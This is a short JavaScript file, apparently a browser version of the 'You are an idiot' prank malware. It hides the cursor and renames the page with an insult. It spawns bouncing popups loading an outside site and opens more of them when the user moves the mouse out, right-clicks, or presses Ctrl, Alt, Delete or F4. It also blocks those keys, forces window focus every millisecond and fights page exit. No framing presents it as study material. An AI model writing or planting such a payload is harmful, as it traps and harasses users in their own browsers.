document.querySelectorAll('*').forEach(a => a.style.cursor = 'none');

    var xOff = 5;
    var yOff = 5;
    var xPos = 400;
    var yPos = -100;
    var flagRun = 1;

    document.title = 'You are an idiot!';

    const openWindow = (url) => window.open("https://bl.villainsrule.xyz/lol.html", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    const proCreate = () => {
        for (var i = 0; i < 5; i++) openWindow('https://bl.villainsrule.xyz/lol.html');
    };

    function newXlt() {
        xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newXrt() {
        xOff = Math.ceil(7 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newYup() {
        yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newYdn() {
        yOff = Math.ceil(7 * Math.random()) * 5 - 10;
        window.focus();
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;

        if (xPos > screen.width - 357) newXlt();
        if (xPos < 0) newXrt();

        if (yPos > screen.height - 330) newYup();
        if (yPos < 0) newYdn();

        if (flagRun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout(() => playBall(), 1);
        }
    }

    proCreate();
    playBall();

    window.onmouseout = (e) => {
        e.preventDefault();
        proCreate();
        return null;
    };
	
    window.oncontextmenu = (e) => {
        e.preventDefault();
        proCreate();
        return false;
    }

    window.onkeydown = (e) => {
	e.preventDefault();
        if (event.keyCode == 17 || event.keyCode == 18 || event.keyCode == 46 || event.keyCode == 115) {
            alert("You are an idiot!");
            proCreate();
        }

        return null;
    }

    window.onbeforeunload = function() {
        return "Are you an idiot?";
    };

    setInterval(() => window.focus(), 1);
